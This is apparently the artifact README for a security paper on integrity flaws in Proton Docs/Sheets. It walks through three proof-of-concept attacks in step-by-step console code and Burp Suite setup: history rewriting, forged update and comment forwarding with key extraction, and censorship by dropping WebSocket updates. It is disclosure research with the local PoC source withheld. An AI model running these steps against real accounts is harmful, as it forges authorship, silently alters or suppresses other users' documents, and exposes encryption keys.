Paper title: Data-strophy: When Your Integrity Goes Wild, So Does Your Data!

# Content

* [Setup instruction](#setup-instruction)
* [E1. History rewriting attacks](#e1-history-rewriting-attacks)
* [E2. Context manipulation attacks](#e2-context-manipulation-attacks)
* [E3. Censorship attacks](#e3-censorship-attacks)


We also provide demonstration videos for our PoC of the above three attacks on https://drive.google.com/drive/folders/1YswNVoH97CdZ71Dw8AWAaJ6n5k_fsrJY?usp=share\_link.


We provide a detailed description of the vulnerabilities, their sources, and the methodology used to validate the attacks on https://eprint.iacr.org/2026/1994. *For safety, we do not provide the source code of the local execution programs of our PoC.* But we keep the steps which requires local execution in the following experimental steps for completeness.


## Setup instruction

### Environment and dependencies:

Windows or Linux or MacOS

Node.js (>= 18, <21)

Firefox (Other browsers also work; we recommend Firefox and provide instructions for it.)

bash (> 3.0)

Burp Suite (v 2026.8)

Package: Yjs (13.6.29), @protontech/pmcrypto (8.8.1), google-protobuf (4.0.1), @standardnotes/domain-core (1.41.3), comlink (4.4.2), tsx (4.21.0), @types/node (25.2.0)

The installation instructions are provided in the setup instructions. 

### Install environment and dependencies

The PoC code is written in TypeScript and can be run locally with Node.js.

Requirements: Node.js >= 18. Please check your Node.js version with the command
```bash
  node -v
```
Or install it with
```bash
brew install node (in MacOS)
sudo apt install nodejs (in Linux)
winget install OpenJS.NodeJS (in Windows)
```

### Install Burp Suite and configuration

1) Download and install Burp Suite: <https://portswigger.net/burp>. Community Edition is sufficient (free).
2) Launch Burp Suite.
3) Choose `Temporary Project → Next → Use Burp defaults → Start Burp`.
4) Go to `Proxy → Proxy Settings → Proxy listeners` and confirm there is a listener on: `127.0.0.1:8080` with `Loopback only`.
5) Open a browser window that is used to log in to the victim's account later.
6) Open Firefox and go to `Settings → General → Network Settings → Settings`. Select `Manual proxy configuration`. Set HTTP Proxy `127.0.0.1` and Port `8080`. Select `Also Use this proxy for HTTPS`. Click `OK`.
7) Install the Burp CA certificate in Firefox as follows.\
   In Firefox, visit `http://burp`, click `CA Certificate`, and download the certificate file (`cacert.der`).\
   In Firefox, go to `Settings → Privacy & Security → Certificates → View Certificates`. Open the `Authorities` tab. Click `Import` and select the certificate file. Enable `Trust this CA to identify websites` and `Trust this CA to identify email users`. Click `OK`.

### Install PoC code
Download the `PoCcode` folder and navigate to it in the terminal. 

Install Poc code and dependencies with
```bash
  npm install
```
Make sure you are in the `PoCcode` folder before running `npm install`.

### Basic test

1) Navigate to the `PoCcode` directory.
2) Run the following command.
```bash
bash run-basic-tests.sh
```

If you install successfully, you can see the following output in the terminal.
```bash
=== Running environment smoke test ===
[SUCCESS] Environment test passed. Node and tsx are working.
[SUCCESS] Dependencies test: yjs imported successfully (Object: Doc)
[SUCCESS] Dependencies test: pmcrypto imported successfully.
=== Running forgeMerge ===
=== Update 0 ===
Item from client 1182327057 at clock 0
  origin 90984712 at clock 6
Item from client 1182327057 at clock 3
  origin 1620626250 at clock 7
Item from client 1182327057 at clock 4
  origin 1620626250 at clock 8
Item from client 1182327057 at clock 5
  origin 1620626250 at clock 9
DeleteSet:
  Deleted from client 1620626250: clock=7, len=3
----------------------

=== Update 1 ===
Item from client 1182327057 at clock 0
  origin 90984712 at clock 6
Item from client 1182327057 at clock 3
  origin 1620626250 at clock 7
Item from client 1182327057 at clock 4
  origin 1620626250 at clock 8
Item from client 1182327057 at clock 5
  origin 1620626250 at clock 9
DeleteSet:
  Deleted from client 1620626250: clock=7, len=3
----------------------

Merged update length: 310
Merged update written to file.
=== Running forgeupd ===
uuid: 22c9b5c9-e41f-4118-834a-af019f51c3c1
new ciphertext len: 977
Both scripts completed successfully. Files were not cleared.
```

### Preparation

Create three Proton accounts, one for the victim, one for the attacker, and one for the other user in the group. In the following, we use `victim@proton.com`, `attacker@proton.com`, and `user@proton.com` to refer to the three accounts, respectively. For the three accounts, enable the `Beta access` option: open the Proton Drive page, click the `Settings` button, and then enable `Beta access`. (Proton moved the squash function to `Beta access`, and E2 and E3 are not affected by whether `Beta access` is enabled.)

## E1. History rewriting attacks

Create a document (using any account) and share it with the other two accounts with write permission. Type some content in it with the three accounts. 


### 1. Adjust the squashing trigger threshold and factor.

&emsp; 1\) Open the document in the browser under `attacker@proton.com` and enable the browser's developer tools (press F12). Go to `Debugger`, and go to `Scopes` (on the right side of the page), and enable `Show original variables`. Go to `Search` which can search the code line. 

&emsp; 2\) Set breakpoints at the code lines: \
&emsp;&emsp;  * `return this.numberOfMessages() > GetCommitDULimit...` in `DecryptedCommit.ts` \
&emsp;&emsp; * `const squashCommitResult = await this.squashTheCommit(decryptedCommit, squashLock, keys, dto.documentType)` in `SquashDocument.ts`.\
&emsp;&emsp; * `const desiredNumberOfUpdates = Math.floor(config.limit * config.factor)` in `SquashAlgorithm.ts`.

&emsp; 3\) Refresh the webpage and pause at the first breakpoint. At the console, run the following code to check the identifier of the function `GetCommitDULimit` (may wait a second and try a few more times).
  ```bash
  GetCommitDULimit
  ```
  You will get output in the following form:
  ```bash
  function eP(e)
  ```
  Run the code to check the current number of update messages.
  ```bash
  this.numberOfMessages()
  ```
  Run the code to adjust the threshold to $t$.
  ```bash
  eP = function modifythrehsold () { return t }
  ```
  You should set $t$ to be less than the number of update messages. 

  Run the code to check whether the threshold is modified correctly.
  ```bash
  GetCommitDULimit(documentType)
  ```
  If the output is t, then the threshold is modified correctly.


  &emsp; 4\) Continue to execute and pause at the second breakpoint. Run the code at the console:
  ```bash
  dto.documentType = "sheet"
 ```
 If successful, you can see the output "sheet".
Actually, this step is optional. Please refer to the paper for details. However, in this experiment, we let the attacker take this step. 

  &emsp; 5\) Continue to execute and pause at the second breakpoint. You can adjust the factor to $\alpha$ by running the code at the console:
  ```bash
  config.factor =  α
  ```
  You can see α output in the console. \
  Assume the number of update messages is $n$. Then, the latest $n - t \times \alpha$ updates will be merged. 

### 2. Modify the merged result.

&emsp; 1\) Set a breakpoint at the code line. 

&emsp;&emsp; * `updatesToSquash.map((update) => {` in `SquashAlgorithm.ts`. 

&emsp; 2\) Continue to execute and pause at the above breakpoint. Obtain the updates to be merged. First, check the number of updates to be merged by running the following code in the console:
```bash
updatesToSquash.length 
```
Then, obtain each update content by running the code in the console:
```bash
for (let i = 0; i < updatesToSquash.length; i++) {
  const updcontent = Array.from(updatesToSquash[i].decrypted.content).join(',');
  console.log(updcontent); 
}
```
where i is set to be 0, 1, ..., updatesToSquash.length - 1.

&emsp; 3\) Copy all the updates to be merged into `./forgemerge/merge.txt` with order, with each update on a separate line.

&emsp; 4\) Check the updates with the local PoC code. Execute the following code in the command:
```bash
npx tsx src/checkMerge.ts
```
It will output the modifications of all updates.

&emsp; 5\) Modify the updates and put the modified ones in `./forgemerge/forgedmerge.txt`, with each update on a separate line. In this experiment, we let the attacker delete the last one, i.e., copy all lines in `./forgemerge/merge.txt` except the last line to `./forgemerge/forgedmerge.txt`. (For simplicity, the attacker deletes some updates. Actually, the attacker can insert new updates.)\
Execute the following code in the command:
```bash
npx tsx src/forgeMerge.ts
```
The forged merged result is output to `./forgemerge/forgedmergeresult.txt`.

### 3. Send the squash result to the server.
&emsp; 1\) Set a breakpoint at the code line. \
&emsp; * `if (isDocumentUpdateCompressionEnabled(this.unleashClient, documentType)) {` in `SquashDocument.ts`.

&emsp; 2) Continue to execute and pause at the above breakpoint. 

&emsp; 3) Check the length of the original merged update. Run the code in the console.
```bash
squashedContent.length
```
Check the length of the modified merged update. Run the code in the console by copying the content in `./forgemerge/forgedmergeresult.txt` to [].
```bash
updmrg = new Uint8Array([...])
updmrg.length
```

&emsp; 4) (Since we delete an update, so the length must change.) If the original merged update and the modified update have the same length, then run the code in the console.
```bash
squashedContent.set(updmrg)
```
Continue to execute. 

&emsp; 5) If the modified update has a different length than the original one, you can redefine the `compressDocumentUpdate` function (may try a few times). \
&emsp; * At the console, run the following code to check the identifier of the `compressDocumentUpdate` function.
```bash
  compressDocumentUpdate
```
You will get output in the following form:
```bash
  function tx(e)
```
&emsp; * Run the following code to modify it by copying the content in `./forgemerge/forgedmergeresult.txt` to [].
```bash
tx = function modifymrg () { const forgemerge = new Uint8Array([...]); return forgemerge; }
```
Run the following code to check if the change was successful.
```bash
  compressDocumentUpdate(squashedContent)
```
If the console outputs the content in  `./forgemerge/forgedmergeresult.txt`, then it succeeds.

Continue execution.

If successful, you'll see the following output in the console.
```bash
[Squash] Took XX seconds to complete successfully
```

### Attack result.
Open the document with `user@proton.com`, and you can see that the document content and history have been modified. 

## E2. Context manipulation attacks

In this experiment, we directly verify the context manipulation attack in the suggesting mode. By verifying this, we can also show that the attack can also work in the editing mode (The mechanism of Proton Docs/Sheets can be found in our paper).

Create two documents, $D_1$ and $D_2$. After creating $D_1$, open it under the suggesting mode and type some content in it. (Make sure the first character is inserted under the suggesting mode and please do not type in $D_2$ for now.)  \
 `attacker@proton.com` and `victim@proton.com` have wirte access to $D_1$ and $D_2$. `user@proton.com` has write/read to $D_2$. `attacker@proton.com` wants to forward `victim@proton.com`'s update on $D_1$ to $D_2$. Open two browser windows and sign in to `attacker@proton.com` and `victim@proton.com`, respectively. 

To quickly test the validity of the attack, we set that $D_2$ is an empty document (newly created, and never done any editing in it), and `attacker@proton.com` forwards the first update message in $D_1$ to $D_2$, so that the forwarded update can be directly applied to $D_2$ without further modifying the identifiers of updates in Yjs level. So you should skip this whole Step 2 and directly move to execute the Step 3.

Let `victim@proton.com` and `attacker@proton.com`'s network traffic through Burp Suite (you can set different ports for them, i.e., 8080 and 8081). 


### 1. Manufacture an update message.

&emsp; 1\) Get the symmetric encryption key of the two documents.

For each document, `attacker@proton.com` opens it and sets a breakpoint at the code line `const { node, fromCache: nodeIsFromCache } = nodeResult.getValue()` in the `LoadDocument.ts`. Reload the page and pause at the breakpoint. Then, at the console, run the following code (maybe try a few times):
```bash
 const symkey = Array.from(keys.documentContentKey.data).join(',');
 console.log(symkey);
```
The output of the above code is the symmetric encryption key of the document. Please use this method to obtain the document encryption key of $D_1$ and $D_2$, and copy them to `./symKeyDoc1.txt` and `./symKeyDoc2.txt`, respectively.
Notice that the key must be exactly 32 values. 


&emsp; 2\) Obtain an update message.

`attacker@proton.com` opens $D_1$ and sets a breakpoint at the code line `return updates` in the `document-update-chunking.ts`. Reload this page and pause at this point. `updates` records all update messages. Get the number of updates:
```bash
updates.length
```

Choose an update message and get the ciphertext and metadata by running the following code in the console. Reset all i in the following code, where i is the index, i = 0,1, ..., updates.length - 1.
```bash
 const updcontent = Array.from(updates[i].encryptedContent).join(',');
 console.log(updcontent); 
 console.log(updates[i].authorAddress)
 console.log(updates[i].timestamp) 
```
For simplicity, choose the first update. Run the following code. 
```bash
 const updcontent = Array.from(updates[0].encryptedContent).join(',');
 console.log(updcontent); 
 console.log(updates[0].authorAddress)
 console.log(updates[0].timestamp) 
```
Copy the outputs to `./forgeupd/updcontent.txt`, `./forgeupd/updaddress.txt`, and `./forgeupd/updts.txt`, respectively.

&emsp; 3\) Generate a forged update by executing the local PoC code with the following command:
```bash
npx tsx src/forgeupd.ts
```
It will output a forged update message to `./forgeupd/forgedupdatemsg.txt` and the update plaintext to to `./forgeupd/updplain.txt`.
If the key is not 32-value, an error message will be output as a reminder. 

### 2. Generate bridge updates to apply the forged update.

In the experiment, we chose the first update, so we can skip the whole step 2 and directly execute the Step 3. 

&emsp; 1\) 
`attacker@proton.com` determines the insert position in $D_2$ and obtains the position at Yjs level. 
`attacker@proton.com` opens $D_2$ and sets a breakpoint at the code line `let update = updateContentBeforeCompressionAndChunking` in the `WebsocketService.ts`. Type a character at the desired insertion position, and the execution pauses at the breakpoint. Then, run the following code at the console:
```
const upd = Array.from(updateContentBeforeCompressionAndChunking).join(',');
console.log(upd);
```
Copy the output to the `./forgeupd/posindex.txt`.

&emsp; 2\) Generate updates with the desired identifiers by executing the local PoC code with the following command:
```bash
npx tsx src/genUpd.ts
```
It will output the length of the generated update. 
The desired update will output to the `./forgeupd/desiredupd.txt`. 

Note: The current `genUpd.ts` only supports generating updates with desired identifiers for documents in editing mode. Spreadsheets and document under the suggestion/mode have more complicated data structure, and making such an update apply to another sheet/document may need to be analyzed case by case. To test the validity of attacks on Sheets and Docs in the suggestion/comment mode, we suggest setting $D_2$ as a newly created blank doucment and forwarding the first update in $D_1$ to it. Then, you can see the forged update has been applied to $D_2$.

### 3. Send the forged update and inject the bridge update. 

&emsp; 1\) To send the forged update, 
`attacker@proton.com` opens $D_2$ and sets a breakpoint at the code line `this.socket?.send(data)` in `WebsocketService.ts`. Type a character in $D_2$ and then pause at the point. Run the following code in the console by copying the content in `forgedupdatemsg.txt` to [].
```bash
  const forgemsg = new Uint8Array([...])
  this.socket?.send(forgemsg)
```
If succeed, you will see the log in the console, shown like 
```bash
Received ack message ...
```

Since we chose the first update, we can skip the following step of injecting the bridge updates.

&emsp; 2\) To inject the bridge update in `./forgeupd/desiredupd.txt`, set a breakpoint at the code line `const updateMessage = this.createSyncMessagePayload(updateToPropagate, isInConversionFunnel ? 'conversion' : 'du')` in `DocState.ts`. Type a character and then pause at the breakpoint. Run the code at the console to check the update length. 
```bash
updateToPropagate.length
```
If the length is the same as that of the specific update, then run the code at the console by copying the bridge update to [...].
```bash
updateToPropagate.set([...])
```
Otherwise, run the codes at the console by copying the specific update to [...].
```bash
this.createSyncMessagePayload = function reviseUpd (e, t) {upd = new Uint8Array([...]); return {type: { wrapper: 'du' }, content: upd,} }
```
Continue to execute. 

### 4. Manufacture the corresponding comment message. 

&emsp; 1\) Launch Burp Suite.\
 Go to `Proxy → Proxy setting → Response interception rules → Add`. \
 Set `Boolean operator: And`, `Match type: URL`, `Match relationship: Matches`, and `Match condition: ==/threads`. \
 Check the `Enabled` box for the new rule. Check `Intercept responses based on the following rules`.\
 Unenabled other interception rules, including `Request interception rules`, other items in `Response interception rules`, and `WebSocket interception rules`.
Go to `Proxy → Intercept → intercept on`. \
Use `attacker@proton.com` to open the document $D_1$, and then you can see some blocked messages in Burp Suite. Let the response, which only includes `Code` and `CommentThreads`, forward. Then, you can see all the comment messages. \
Choose one comment message. You can choose the first comment message (which has the smallest creation timestamp) that corresponds to the first update message.
Copy the `Mark` field to `./forgecmt/cmtmarkid.txt`, the `Content` field to `./forgecmt/cmtcontent.txt`, and the `AuthorEmail` field to `./forgecmt/cmtaddress.txt`.

&emsp; 2\) Generate a forged comment message by executing the local PoC code with the following command:
```bash
npx tsx src/forgecmt.ts
```
It will output a forged comment ciphertext content to `./forgecmt/forgedcmt.txt`.
If the key is not 32-value, an error message will be output as a reminder. 


### 5. Create a forged comment thread at the server. 

&emsp; 1\) `attacker@proton.com` opens the document $D_2$ and sets breakpoints at `const result = await this.api.createThread(` and `const response = result.getValue()` in `CreateThread.ts`.

&emsp; 2\) `attacker@proton.com` types a character in $D_2$ under the suggesting mode, and the execution pauses at the first breakpoint. Let markID1 be the markID of the forged update (copy from `./forgecmt/cmtmarkid.txt`). Let forgedcmt be the content in `./forgecmt/forgedcmt.txt`.
```bash
id = "markID1"
C = "forgedcmt"
const result = await this.api.createThread(
      {
        markId: id,
        encryptedMainCommentContent: C,
        type: dto.type,
        commentType,
        decryptedDocumentName: dto.decryptedDocumentName,
      },
      dto.entitlements,
    )
```

Continue execution and pause at the second point. Run the code at the console to obtain the thread identifier `CommentThreadID`.
```bash
result.getValue().CommentThread.CommentThreadID
```

### 6. Make the forged comment message correctly decrypted.

Since the attack requires a lazy server, we simulate it with man-in-the-middle attacks with the assistance of Burp Suite.\
Launch Burp Suite. Go to `Proxy → Proxy setting → Response interception rules → Add`. Set `Boolean operator: And`, `Match type: URL`, `Match relationship: Matches`, and `Match condition: ==/threads/CommentThreadID` (e.g., `==/threads/odJysBeNf4QUrdgTWaMM6Q`)\
Check the `Enabled` box for the new rule. Check `Intercept responses based on the following rules` and disable other interception rules.\
Go to `Proxy → Intercept → intercept on`.

Let `user@proton.com` open the document $D_2$, and then you can see the forge comment messages in Burp Suite.

In Burp Suite, edit the response by replacing the current `AuthorEmail` with the victim's emailn `victim@proton.com` address and then click `Forward`. Then, forward the corresponding update message in $D_1$ to $D_2$. 


### Attack result:
`user@proton.com` can see that the modification authored by `victim@proton.com` in $D_2$.


## E3. Censorship attacks

### (1) Attack the online users.

Assume `attacker@proton.com` and `victime@proton.com` are editing a shared document. Log in to the two accounts in two browser windows and let `victim@proton.com`'s network traffic through Burp Suite. 

#### 1. Launch Burp Suite.

Go to `Proxy → Proxy setting → WebSocket interception rules`. Check `intercept server-to-client messages` and unapply any other interception rules. 

#### 2. Intercept update messages.

&emsp; 1\) `attacker@proton.com` types some content in $D_1$.

&emsp; 2\) Then, you will see the update message in `Proxy → Websocket History`. A message that ends with a uuid is an update message. You can drop the update message forwarded to `victim@proton.com` in Burp Suite. 

### Attack result.
`victim@proton.com` does not see `attacker@proton.com`'s modifications without getting any warning. 


### (2) Attack the newly online users.

#### 1. Download Jython and Launch Burp Suite.

Download Jython standalone: <https://www.jython.org/download>, e.g., jython-standalone-2.7.x.jar.

#### 2. Configure Jython in Burp Suite.
Go to
```bash
Extensions → Extensions settings → Extensions → Core extension settings → Python environment → Location of Jython standalone JAR file
```
Select file
```bash
/path/to/jython-standalone-2.7.x.jar
```
#### 3. Choose to drop the specified update.

Let `victim@proton.com`'s network traffic through Burp Suite. 

&emsp; 1\) Open to the script file `PoCcode/protobuf_remove.py`.\
&emsp; 2\) Find `REMOVE_INDEX = 0` in Line 12, which indicates the index (starting from 0) of the update messages to be deleted or dropped. \
&emsp; 3\) You can modify the index REMOVE_INDEX to specify dropping which update message. `REMOVE_INDEX = 0` by default, say drop the first update, then the document turns to be empty because the first update is removed, and the subsequent updates cannot be applied either.

#### 4. Load the extension to Burp Suite.

&emsp; 1\) Go to
```bash
Extensions → Burp extensions → Add → Extension details
```

&emsp; 2\) Select `Extension type → Python` `Extension File → /path/to/protobuf_remove.py` and check `Reload extension automatically when file changes`. Click `Next`.
You should see logs in Burp Suite Burp Extension output page:
```bash
[+] extension loaded
```

#### 5. Re-open/refresh the document.
Let `attacker@proton.com` re-open the document. You can see logs in Burp Suite Burp Extension output page, shown like:
```bash
[+] outer message size = 2818
[+] item[0] size=675
[+] removed item[0]
[+] item[1] size=425
[+] item[2] size=425
[+] item[3] size=425
[+] item[4] size=425
[+] item[5] size=425
[+] total items = 6
[+] new outer size = 2140
[+] response modified
```
### Attack result.
`victim@proton.com` will see an empty document without any warning, because the first update is removed, and the subsequent updates cannot be applied either. While other users can see the document content. 
